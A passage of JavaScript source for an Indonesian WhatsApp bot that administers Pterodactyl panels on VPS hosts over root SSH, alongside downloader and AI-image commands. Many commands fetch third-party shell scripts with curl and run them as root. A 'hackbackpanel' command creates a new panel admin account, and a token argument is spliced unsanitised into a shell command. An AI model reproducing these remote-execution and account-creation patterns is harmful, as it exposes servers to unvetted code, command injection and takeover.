if (data.toString().includes('Do you want to automatically configure HTTPS using Let\'s Encrypt? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Select the appropriate number [1-2] then [enter] (press \'c\' to cancel)')) {
stream.write('1\n');
} 
if (data.toString().includes('I agree that this HTTPS request is performed (y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Proceed anyways (your install will be broken if you do not know what you are doing)? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('(yes/no)')) {
stream.write('y\n');
} 
if (data.toString().includes('Initial configuration completed. Continue with installation? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Still assume SSL? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Please read the Terms of Service')) {
stream.write('y\n');
}
if (data.toString().includes('(A)gree/(C)ancel:')) {
stream.write('A\n');
} 
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
});
}

ress.on('ready', async () => {
await m.reply("Memproses *install* server panel \nTunggu 1-10 menit hingga proses selsai")
ress.exec(deletemysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalPanel();
}).on('data', async (data) => {
await stream.write('\t')
await stream.write('\n')
await console.log(data.toString())
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).connect(connSettings);
}
break  

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "startwings": case "configurewings": {
if (!isCreator) return Reply(mess.owner)
let t = text.split('|')
if (t.length < 3) return m.reply(example("ipvps|pwvps|token_node"))

let ipvps = t[0]
let passwd = t[1]
let token = t[2]

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `${token} && systemctl start wings`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("*Berhasil menjalankan wings ✅*\n* Status wings : *aktif*")
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("y\n")
stream.write("systemctl start wings\n")
m.reply('STDERR: ' + data);
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "hbpanel": case "hackbackpanel": {
if (!isCreator) return Reply(mess.owner)
let t = text.split('|')
if (t.length < 2) return m.reply(example("ipvps|pwvps"))

let ipvps = t[0]
let passwd = t[1]

const newuser = "admin" + getRandom("")
const newpw = "admin" + getRandom("")

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
let teks = `
*Hackback panel sukses ✅*

*Berikut detail akun admin panel :*
* *Username :* ${newuser}
* *Password :* ${newpw}
`
await conn.sendMessage(m.chat, {text: teks}, {quoted: m})
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("skyzodev\n")
stream.write("7\n")
stream.write(`${newuser}\n`)
stream.write(`${newpw}\n`)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "subdomain": case "subdo": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("alluffy|ipserver"))
if (!text.split("|")) return m.reply(example("alluffy|ipserver"))
let [host, ip] = text.split("|")
let dom = await Object.keys(global.subdomain)
let list = []
for (let i of dom) {
await list.push({
title: i, 
id: `.domain ${dom.indexOf(i) + 1} ${host}|${ip}`
})
}
await conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Domain',
          sections: [
            {
              title: 'List Domain',
              highlight_label: 'Recommended',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Domain Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m}) 
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "domain": {
if (!isCreator) return Reply(mess.owner)
if (!args[0]) return m.reply("Domain tidak ditemukan!")
if (isNaN(args[0])) return m.reply("Domain tidak ditemukan!")
const dom = Object.keys(global.subdomain)
if (Number(args[0]) > dom.length) return m.reply("Domain tidak ditemukan!")
if (!args[1].split("|")) return m.reply("Hostname/IP Tidak ditemukan!")
let tldnya = dom[args[0] - 1]
const [host, ip] = args[1].split("|")
async function subDomain1(host, ip) {
return new Promise((resolve) => {
axios.post(
`https://api.cloudflare.com/client/v4/zones/${global.subdomain[tldnya].zone}/dns_records`,
{ type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tldnya, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
{
headers: {
Authorization: "Bearer " + global.subdomain[tldnya].apitoken,
"Content-Type": "application/json",
},
}).then((e) => {
let res = e.data
if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content })
}).catch((e) => {
let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e
let err1Str = String(err1)
resolve({ success: false, error: err1Str })
})
})}
await subDomain1(host.toLowerCase(), ip).then(async (e) => {
if (e['success']) {
let teks = `
*Berhasil membuat subdomain ✅*\n\n*IP Server :* ${e['ip']}\n*Subdomain :* ${e['name']}
`
await m.reply(teks)
} else return m.reply(`${e['error']}`)
})
}
break

//=============================================//

case "installtema": {
 if (!isCreator) return Reply(mess.owner);
 if (!text || !text.split("|")) return Reply("Format: ipvps|pwvps");
 let vii = text.split("|");
 if (vii.length < 2) return Reply("Format: ipvps|pwvps");
 
 global.installtema = { vps: vii[0], pwvps: vii[1] };
 
 let headerText = `
✨ *PANEL THEME INSTALLER* ✨
Pilih tema yang ingin kamu install di VPS-mu.

💡 Jika ingin menggunakan *Tema Nebula*, pastikan sudah meng- *install plugin* terlebih dahulu.
 `;

 conn.sendMessage(m.chat, {
 image: { url: 'https://img1.pixhost.to/images/9182/647749507_ochobot.jpg' },
 caption: headerText,
 footer: "⚙️ Powered by Al Luffy Official",
 buttons: [
 {
 buttonId: 'action',
 buttonText: { displayText: '🧩 Pilih Tema' },
 type: 4,
 nativeFlowInfo: {
 name: 'single_select',
 paramsJson: JSON.stringify({
 title: '🧩 Pilih Tema',
 sections: [
 {
 title: "Daftar Tema Tersedia",
 rows: [
 { title: "🧠 Install Plugin", id: `.installplugin` },
 { title: "🌌 Install Nebula", id: `.installtemanebula` },
 { title: "🌙 Install Nightcore", id: `.installtemanightcore` },
 { title: "🌟 Install Stellar", id: `.installtemastellar` },
 { title: "💸 Install Billing", id: `.installtemabilling` },
 { title: "🌀 Install Enigma", id: `.installtemaenigma` },
 { title: "💫 Install Elysium", id: `.installtemaelysium` },
 { title: "🗑️ Uninstall Tema", id: `.uninstallthema` },
 ]
 }
 ]
 })
 }
 }
 ],
 headerType: 4,
 viewOnce: true
 }, { quoted: m });
}
break

//=============================================//

case "uninstallthema": {
    if (!isCreator) return Reply(mess.owner)
    if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

    let ipvps = global.installtema.vps
    let passwd = global.installtema.pwvps
    let pilihan = text

    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    }
    
    const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
    const ress = new Client()

    await Reply("Memproses *uninstall* tema pterodactyl\nTunggu 1-10 menit hingga proses selsai")

    ress.on('ready', () => {
        ress.exec(command, (err, stream) => {
            if (err) throw err
            stream.on('close', async (code, signal) => {    
                await Reply("Berhasil *uninstall* tema pterodactyl ✅")
                ress.end()
            }).on('data', async (data) => {
                console.log(data.toString())
                stream.write(`skyzodev\n`) // Key Token : skyzodev
                stream.write(`2\n`)
                stream.write(`y\n`)
                stream.write(`x\n`)
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data)
            })
        })
    }).on('error', (err) => {
        console.log('Connection Error: ' + err)
        Reply('Katasandi atau IP tidak valid')
    }).connect(connSettings)
}
break

//=============================================//

case "installtemanebula": {
 if (!isCreator) return Reply(mess.owner)
 if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

 let ipvps = global.installtema.vps
 let passwd = global.installtema.pwvps
 let pilihan = text

 const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
 }
 
 const command = `bash <(curl -s https://raw.githubusercontent.com/KiwamiXq1031/installer-premium/refs/heads/main/zero.sh)`
 const ress = new Client()

 ress.on('ready', async () => {
 Reply("Memproses install *thema Nebula* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
 ress.exec(command, (err, stream) => {
 if (err) throw err
 stream.on('close', async (code, signal) => { 
 await Reply("Berhasil install *tema nebula* pterodactyl ✅")
 ress.end()
 }).on('data', async (data) => {
 console.log(data.toString())
 stream.write('2\n')
 stream.write('\n')
 stream.write('\n')
 }).stderr.on('data', (data) => {
 console.log('STDERR: ' + data)
 })
 })
 }).on('error', (err) => {
 console.log('Connection Error: ' + err)
 Reply('Katasandi atau IP tidak valid')
 }).connect(connSettings)
}
break

//=============================================//

case "installplugin": {
 if (!isCreator) return Reply(mess.owner)
 if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

 let ipvps = global.installtema.vps
 let passwd = global.installtema.pwvps
 let pilihan = text

 const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
 }

 const command = `bash <(curl -s https://raw.githubusercontent.com/KiwamiXq1031/installer-premium/refs/heads/main/zero.sh)`
 const ress = new Client()

 ress.on('ready', async () => {
 Reply("Memproses installdepend pterodactyl\nTunggu 1-10 menit hingga proses selesai")
 ress.exec(command, (err, stream) => {
 if (err) throw err
 stream.on('close', async (code, signal) => {
 await Reply("Berhasil install Depend silakan ketik .installnebula ✅")
 ress.end()
 }).on('data', async (data) => {
 console.log(data.toString())
 stream.write('11\n')
 stream.write('A\n')
 stream.write('Y\n')
 stream.write('Y\n')
 }).stderr.on('data', (data) => {
 console.log('STDERR: ' + data)
 })
 })
 }).on('error', (err) => {
 console.log('Connection Error: ' + err)
 Reply('Katasandi atau IP tidak valid')
 }).connect(connSettings)
}
break

//=============================================//

case "installtemastellar": 
case "installtemastelar": {
    if (!isCreator) return Reply(mess.owner)
    if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

    let ipvps = global.installtema.vps
    let passwd = global.installtema.pwvps
    let pilihan = text

    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    }
    
    const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
    const ress = new Client()

    ress.on('ready', async () => {
        m.reply("Memproses install *tema stellar* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
        ress.exec(command, (err, stream) => {
            if (err) throw err
            stream.on('close', async (code, signal) => {    
                await Reply("Berhasil install *tema stellar* pterodactyl ✅")
                ress.end()
            }).on('data', async (data) => {
                console.log(data.toString())
                stream.write(`skyzodev\n`) // Key Token : skyzodev
                stream.write(`1\n`)
                stream.write(`1\n`)
                stream.write(`yes\n`)
                stream.write(`x\n`)
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data)
            })
        })
    }).on('error', (err) => {
        console.log('Connection Error: ' + err)
        Reply('Katasandi atau IP tidak valid')
    }).connect(connSettings)
}
break

//=============================================//

case "installtemanightcore": {
    if (!isCreator) return Reply(mess.owner)
    if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

    let ipvps = global.installtema.vps
    let passwd = global.installtema.pwvps
    let pilihan = text

    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    }
    
    const command = `bash <(curl https://raw.githubusercontent.com/NoPro200/Pterodactyl_Nightcore_Theme/main/install.sh)`
    const ress = new Client()

    ress.on('ready', async () => {
        m.reply("Memproses install *tema night core* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
        ress.exec(command, (err, stream) => {
            if (err) throw err
            stream.on('close', async (code, signal) => {    
                await Reply("Berhasil install *tema nightcore* pterodactyl ✅")
                ress.end()
            }).on('data', async (data) => {
                console.log(data.toString())
                stream.write('1\n')
                stream.write('y\n')
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data)
            })
        })
    }).on('error', (err) => {
        console.log('Connection Error: ' + err)
        Reply('Katasandi atau IP tidak valid')
    }).connect(connSettings)
}
break

//=============================================//

case "installtemaelysium": {
    if (!isCreator) return Reply(mess.owner)
    if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

    let ipvps = global.installtema.vps
    let passwd = global.installtema.pwvps
    let pilihan = text

    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    }
    
    const command = `bash <(curl -s https://raw.githubusercontent.com/LeXcZxMoDz9/kontol/refs/heads/main/bangke.sh)`
    const ress = new Client()

    ress.on('ready', async () => {
        m.reply("Memproses install *tema Elysium* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
        ress.exec(command, (err, stream) => {
            if (err) throw err
            stream.on('close', async (code, signal) => {    
                await Reply("Berhasil install *tema Elysium* pterodactyl ✅")
                ress.end()
            }).on('data', async (data) => {
                console.log(data.toString())
                stream.write('1\n')
                stream.write('y\n')
                stream.write('yes\n')
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data)
            })
        })
    }).on('error', (err) => {
        console.log('Connection Error: ' + err)
        Reply('Katasandi atau IP tidak valid')
    }).connect(connSettings)
}
break

//=============================================//

case "installtemaenigma": 
case "instaltemaenigma": {
    if (!isCreator) return Reply(mess.owner)
    if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

    let ipvps = global.installtema.vps
    let passwd = global.installtema.pwvps
    let pilihan = text

    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    }
    
    const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
    const ress = new Client()

    ress.on('ready', () => {
        m.reply("Memproses install *tema enigma* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
        ress.exec(command, (err, stream) => {
            if (err) throw err
            stream.on('close', async (code, signal) => {    
                await Reply("Berhasil install *tema enigma* pterodactyl ✅")
                ress.end()
            }).on('data', async (data) => {
                console.log(data.toString())
                stream.write(`skyzodev\n`) // Key Token : skyzodev
                stream.write('1\n')
                stream.write('3\n')
                stream.write('https://wa.me/6283143274439\n')
                stream.write('https://whatsapp.com/channel/0029VbAnT9bChq6SZjIjeN1n\n')
                stream.write('https://chat.whatsapp.com/Krglrbk17wl28AIPq2QEpy\n')
                stream.write('yes\n')
                stream.write('x\n')
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data)
            })
        })
    }).on('error', (err) => {
        console.log('Connection Error: ' + err)
        Reply('Katasandi atau IP tidak valid')
    }).connect(connSettings)
}
break

//=============================================//

case "installtemabilling": 
case "instaltemabiling": {
    if (!isCreator) return Reply(mess.owner)
    if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

    let ipvps = global.installtema.vps
    let passwd = global.installtema.pwvps
    let pilihan = text

    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    }
    
    const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
    const ress = new Client()

    ress.on('ready', () => {
        m.reply("Memproses install *tema billing* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
        ress.exec(command, (err, stream) => {
            if (err) throw err
            stream.on('close', async (code, signal) => {    
                await Reply("Berhasil install *tema billing* pterodactyl ✅")
                ress.end()
            }).on('data', async (data) => {
                console.log(data.toString())
                stream.write(`skyzodev\n`) // Key Token : skyzodev
                stream.write(`1\n`)
                stream.write(`2\n`)
                stream.write(`yes\n`)
                stream.write(`x\n`)
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data)
            })
        })
    }).on('error', (err) => {
        console.log('Connection Error: ' + err)
        Reply('Katasandi atau IP tidak valid')
    }).connect(connSettings)
}
break

//=============================================//

case "clearchat": 
case "clc": {
    if (!isCreator) return Reply(mess.owner);
    conn.chatModify(
        { delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.timestamp }] },
        m.chat
    );
}
break;

//=============================================//

case "linkserver": {
 if (!isCreator) return Reply('*[ System Notice ]* Khusus Owner atau Pengguna Premium.');

 const videoPath = './media/Ocho.mp4'; // ✅ gunakan file lokal dari folder media

 const fkontak = {
 key: {
 fromMe: false,
 participant: '0@s.whatsapp.net',
 ...(m.chat ? { remoteJid: m.chat } : {})
 },
 message: {
 contactMessage: {
 displayName: 'Al Luffy Dev',
 vcard: 'BEGIN:VCARD\nVERSION:3.0\nFN:Al Luffy\nTEL;type=CELL:+62xxxxxx\nEND:VCARD'
 }
 }
 };

 let teks = `
┌─「 🔰 *Al Luffy API Panel* 🔰 」─
│ 🌐 *Domain* : ${global.domain || 'Not Set'}
│ 🔑 *API Key* : ${global.apikey || 'Not Set'}
│ 🛡️ *CAPTCHA Key*: ${global.capikey || 'Not Set'}
│───────────────────────────
│ 🌐 *Domain V2* : ${global.domainV2 || 'Not Set'}
│ 🔑 *API Key V2* : ${global.apikeyV2 || 'Not Set'}
│ 🛡️ *CAPTCHA V2* : ${global.capikeyV2 || 'Not Set'}
└───────────────────────────
`;

 await conn.sendMessage(
 m.chat,
 {
 video: { url: videoPath }, // ✅ pakai file lokal
 caption: teks,
 gifPlayback: true,
 gifAttribution: 1,
 contextInfo: {
 mentionedJid: [m.sender],
 externalAdReply: {
 title: 'Ochobot - V5',
 body: 'Panel Access',
 mediaType: 1,
 thumbnailUrl: null,
 showAdAttribution: true,
 sourceUrl: 'https://files.catbox.moe/9vet6l.jpg'
 }
 }
 },
 { quoted: fkontak }
 );
}
break

//=============================================//

case "hd":
case "tohd": {
    if (!/image/.test(mime)) return Reply(`*Contoh penggunaan:*\nReply atau kirim foto dan ketik ${cmd}`);

    const fs = require('fs');
    const fetchModule = await import('node-fetch');
    const fetch = fetchModule.default;
    const { ImageUploadService } = require('node-upload-images');

    try {
        // Download foto dari reply / kirim langsung
        let mediaPath = await conn.downloadAndSaveMediaMessage(qmsg);
        const service = new ImageUploadService('pixhost.to');

        // Upload ke Pixhost → dapat direct link
        let { directLink } = await service.uploadFromBinary(fs.readFileSync(mediaPath), 'ochobot.png');
        let imageUrl = directLink.toString();
        fs.unlinkSync(mediaPath);

        await conn.sendMessage(m.chat, { react: { text: '🔄', key: m.key } });

        // Pakai direct link ke API Remini2 / HD
        let apiUrl = `https://api.siputzx.my.id/api/iloveimg/upscale?image=${encodeURIComponent(imageUrl)}`;

        await conn.sendMessage(
            m.chat,
            { image: { url: apiUrl }, caption: "✅ Foto berhasil di-HD-kan!" },
            { quoted: m }
        );

        await conn.sendMessage(m.chat, { react: { text: '', key: m.key } });

    } catch (e) {
        console.error(e);
        return Reply("❌ Terjadi kesalahan saat memproses gambar!");
    }
}
break;

//=============================================//

case "hd2":
case "tohd2": {
 if (!text) return m.reply(example("link jpg"))
 
 await conn.sendMessage(m.chat, { react: { text: '🔄', key: m.key } })

 try {
 // API Upscale (HD)
 let url = `https://api.siputzx.my.id/api/iloveimg/upscale?image=${encodeURIComponent(text)}`

 await conn.sendMessage(
 m.chat,
 { image: { url: url }, caption: "✅ Foto berhasil di-HD-kan!" },
 { quoted: m }
 )
 } catch (e) {
 console.error(e)
 m.reply("❌ Terjadi error saat memproses gambar.")
 }

 await conn.sendMessage(m.chat, { react: { text: '', key: m.key } })
}
break

//=============================================//

case "facebook": 
case "fb": 
case "fbdl": {
    if (!text) return Reply(example("linknya"));
    if (!text.startsWith('https://')) return Reply("Link tautan tidak valid!");

    await conn.sendMessage(m.chat, { react: { text: '🕖', key: m.key } });

    try {
        const res = await fetchJson(`https://api.resellergaming.my.id/download/facebook?url=${encodeURIComponent(text)}`);

        if (!res.status || !res.result) return Reply("❌ Tidak ada link video yang bisa diunduh!");

        const videoUrl = res.result.media || (res.result.video?.[0]?.url);
        if (!videoUrl) return Reply("❌ Tidak ada link video yang valid!");

        const caption = `🎥 *Facebook Downloader*
📜 Judul: ${res.result.title || 'Tidak diketahui'}
⏱️ Durasi: ${res.result.duration || 'Tidak ada data'}
✅ Sumber: Script Ochobot`;

        await conn.sendMessage(
            m.chat,
            {
                video: { url: videoUrl },
                mimetype: "video/mp4",
                caption
            },
            { quoted: m }
        );

        await conn.sendMessage(m.chat, { react: { text: '', key: m.key } });
    } catch (e) {
        console.error(e);
        Reply("❌ Terjadi kesalahan saat mengambil video Facebook!");
    }
}
break;

//=============================================//

case "capcut": {
    if (!text) return Reply(example("linknya"));
    if (!text.startsWith('https://')) return Reply("Link tautan tidak valid!");

    await conn.sendMessage(m.chat, { react: { text: '🕖', key: m.key } });

    try {
        const res = await fetchJson(`https://api.resellergaming.my.id/download/capcut?url=${encodeURIComponent(text)}`);
        if (!res.status || !res.result?.videoUrl) return Reply("❌ Tidak ada video yang bisa diunduh!");

        const hasil = res.result;
        const caption = `
🎬 *CapCut Template Downloader ✅*

*🎥 Judul:* ${hasil.title}
*👤 Pembuat:* ${hasil.author.name}
*❤️ Likes:* ${hasil.likes}
*📅 Tanggal:* ${hasil.date}
*🔗 Pengguna:* ${hasil.pengguna}
        `;

        await conn.sendMessage(
            m.chat,
            {
                video: { url: hasil.videoUrl },
                mimetype: "video/mp4",
                caption: caption,
                thumbnail: { url: hasil.posterUrl }
            },
            { quoted: m }
        );

        await conn.sendMessage(m.chat, { react: { text: '', key: m.key } });
    } catch (e) {
        console.error("Capcut Error:", e);
        Reply("❌ Terjadi kesalahan saat mengunduh video CapCut!");
    }
}
break;

//=============================================//

case "instagram":
case "igdl":
case "ig": {
    if (!text) return Reply(example("linknya"));
    if (!text.startsWith('https://')) return Reply("Link tautan tidak valid!");

    await conn.sendMessage(m.chat, { react: { text: '🕖', key: m.key } });

    try {
        const res = await fetchJson(`https://api.resellergaming.my.id/download/instagram?url=${encodeURIComponent(text)}`);

        // Ambil link video dari res.result[0].url_download
        const videoUrl = res?.result?.[0]?.url_download;

        if (!videoUrl) {
            console.log("Response API:", res);
            return Reply("❌ Tidak ada video yang bisa diunduh!");
        }

        await conn.sendMessage(
            m.chat,
            {
                video: { url: videoUrl },
                mimetype: "video/mp4",
                caption: `*Instagram Downloader ✅*\n📺 ${res.result[0].kualitas || 'Video'}`
            },
            { quoted: m }
        );

        await conn.sendMessage(m.chat, { react: { text: '', key: m.key } });
    } catch (e) {
        console.error("Instagram Error:", e);
        Reply("❌ Terjadi kesalahan saat mengunduh video Instagram!");
    }
}
break;

//=============================================//

case "aiimage": {
  let cmd = "aiimage";
  if (!text) return Reply(`❌ Masukkan prompt!\n\nContoh: *${cmd} harimau hijau*`);

  await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });

  try {
    const fetch = (await import("node-fetch")).default;
    const url = `https://apizsa.vercel.app/ai/genai?prompt=${encodeURIComponent(text)}&model=Hijau`;
    const response = await fetch(url);

    if (!response.ok) return Reply("❌ Gagal mengambil data dari API!");
    const buffer = await response.arrayBuffer();
    const result = Buffer.from(buffer);

    await conn.sendMessage(
      m.chat,
      {
        image: result,
        caption: `✅ *AI Image Generator*\n📸 Prompt: ${text}`
      },
      { quoted: m }
    );

    await conn.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
  } catch (e) {
    console.error(e);
    Reply("❌ Terjadi kesalahan saat memproses gambar!");
  }
}
break;

//=============================================//

case "buatgambar": {
 if (!isCreator) return Reply("🚫 Hanya owner yang bisa menggunakan fitur ini.");

 if (!q) return Reply("⚠️ Masukkan prompt setelah command!\nContoh: *.buatgambar kucing jadi astronot di bulan*");

 Reply("⏳ Lagi bikin gambar AI, sabar bentar...");

 try {
 let res = await fetch(`https://api.siputzx.my.id/api/ai/flux?prompt=${encodeURIComponent(q)}`);
 if (!res.ok) throw new Error("Gagal ambil respon API");

 let buffer = await res.arrayBuffer();
 let imageBuffer = Buffer.from(buffer);

 await conn.sendMessage(m.chat, {
 image: imageBuffer,
 caption: `🖼️ Gambar AI siap!\nPrompt: ${q}`
 }, { quoted: m });

 } catch (e) {
 console.error(e);
 Reply("⚠️ Terjadi error saat bikin gambar AI.");
 }
}
break

//=============================================//

case "aifoto": {
    let cmd = "aifoto"
    if (!text) return m.reply(`❌ Masukkan prompt!\n\nContoh: *${cmd} naga cyberpunk*`)
    
    await conn.sendMessage(m.chat, { react: { text: '🎨', key: m.key } })

    try {
        const fetch = (await import("node-fetch")).default
        let api = `https://api.siputzx.my.id/api/ai/flux?prompt=${encodeURIComponent(text)}`
        let res = await fetch(api)

        if (!res.ok) return Reply(`❌ Gagal membuat foto AI!\nStatus: ${res.status}`)

        let buffer = await res.buffer()

        await conn.sendMessage(
            m.chat,
            {
                image: buffer,
                caption: `✅ *Foto AI berhasil dibuat!*\n\n🧠 Prompt: ${text}`,
            },
            { quoted: m }
        )
    } catch (e) {
        console.error(e)
        Reply("❌ Terjadi error saat membuat foto AI.")
    }

    await conn.sendMessage(m.chat, { react: { text: '', key: m.key } })
}
break

//=============================================//

case "mediafire": {
if (!text) return m.reply(example("linknya"))
if (!text.includes('mediafire.com')) return m.reply("Link tautan tidak valid")
await mediafire(text).then(async (res) => {
if (!res.link) return m.reply("Error! Result Not Found")
await conn.sendMessage(m.chat, {document: {url: res.link}, fileName: res.judul, mimetype: "application/"+res.mime.toLowerCase()}, {quoted: m})
}).catch((e) => m.reply("Error"))
}
break

//=============================================//

case "ytmp4": {
    if (!text) return m.reply(example("linknya"))
    if (!text.startsWith("http")) return m.reply("❌ Link tidak valid!")
    await conn.sendMessage(m.chat, { react: { text: '🕖', key: m.key } })

    try {
        // Fetch API Video
        let anu = await fetchJson(`https://api.vreden.my.id/api/v1/download/youtube/video?url=${encodeURIComponent(text)}&quality=360`)

        if (!anu || !anu.status || !anu.result || !anu.result.download) {
            return m.reply("⚠️ Error! Video tidak ditemukan.")
        }

        let meta = anu.result.metadata
        let down = anu.result.download

        // Kirim Thumbnail + Info Video
        await conn.sendMessage(
            m.chat,
            {
                image: { url: meta.image },
                caption: `🎬 *YOUTUBE MP4*\n\n📌 *Title:* ${meta.title}\n👤 *Author:* ${meta.author?.name || "Unknown"}\n⏱️ *Duration:* ${meta.duration?.timestamp || "?"}\n👁️ *Views:* ${meta.views || "?"}\n📅 *Uploaded:* ${meta.ago || "?"}\n\n🔗 [YouTube](${meta.url})`
            },
            { quoted: m }
        )

        // Kirim Video
        await conn.sendMessage(
            m.chat,
            {
                video: { url: down.url },
                mimetype: "video/mp4",
                fileName: down.filename || "video.mp4"
            },
            { quoted: m }
        )

    } catch (e) {
        console.error(e)
        m.reply("⚠️ Terjadi error saat memproses video.")
    }

    await conn.sendMessage(m.chat, { react: { text: '', key: m.key } })
}
break

//=============================================//

case "ytmp3": {
    if (!text) return m.reply(example("linknya"))
    if (!text.startsWith("http")) return m.reply("❌ Link tidak valid!")
    await conn.sendMessage(m.chat, { react: { text: '🕖', key: m.key } })

    try {
        // Fetch API Audio
        let anu = await fetchJson(`https://api.vreden.my.id/api/v1/download/youtube/audio?url=${encodeURIComponent(text)}&quality=128`)

        if (!anu || !anu.status || !anu.result || !anu.result.download) {
            return m.reply("⚠️ Error! Audio tidak ditemukan.")
        }

        let meta = anu.result.metadata
        let down = anu.result.download

        // Kirim Thumbnail + Info Video
        await conn.sendMessage(
            m.chat,
            {
                image: { url: meta.image },
                caption: `🎵 *YOUTUBE MP3*\n\n📌 *Title:* ${meta.title}\n👤 *Author:* ${meta.author?.name || "Unknown"}\n⏱️ *Duration:* ${meta.duration?.timestamp || "?"}\n👁️ *Views:* ${meta.views || "?"}\n📅 *Uploaded:* ${meta.ago || "?"}\n\n🔗 [YouTube](${meta.url})`
            },
            { quoted: m }
        )

        // Kirim Audio
        await conn.sendMessage(
            m.chat,
            {
                audio: { url: down.url },
                mimetype: "audio/mpeg",
                fileName: down.filename || "audio.mp3",
                ptt: false
            },
            { quoted: m }
        )

    } catch (e) {
        console.error(e)
        m.reply("⚠️ Terjadi error saat memproses audio.")
    }

    await conn.sendMessage(m.chat, { react: { text: '', key: m.key } })
}
break

//=============================================//

case "play": {
 let cmd = "play"
 if (!text) return m.reply(`❌ Masukkan judul lagu!\n\nContoh: *${cmd} dj tiktok*`)
 
 await conn.sendMessage(m.chat, { react: { text: '🔎', key: m.key } })

 try {
 const fetch = (await import("node-fetch")).default
 const api = `https://api.vreden.my.id/api/v1/download/play/audio?query=${encodeURIComponent(text)}`
 const res = await fetch(api)
 const anu = await res.json()

 if (!anu?.status || !anu.result?.download) return Reply("❌ Lagu tidak ditemukan!")

 const meta = anu.result.metadata
 const down = anu.result.download

 // kirim info lagu
 await conn.sendMessage(
 m.chat,
 {
 image: { url: meta.image },
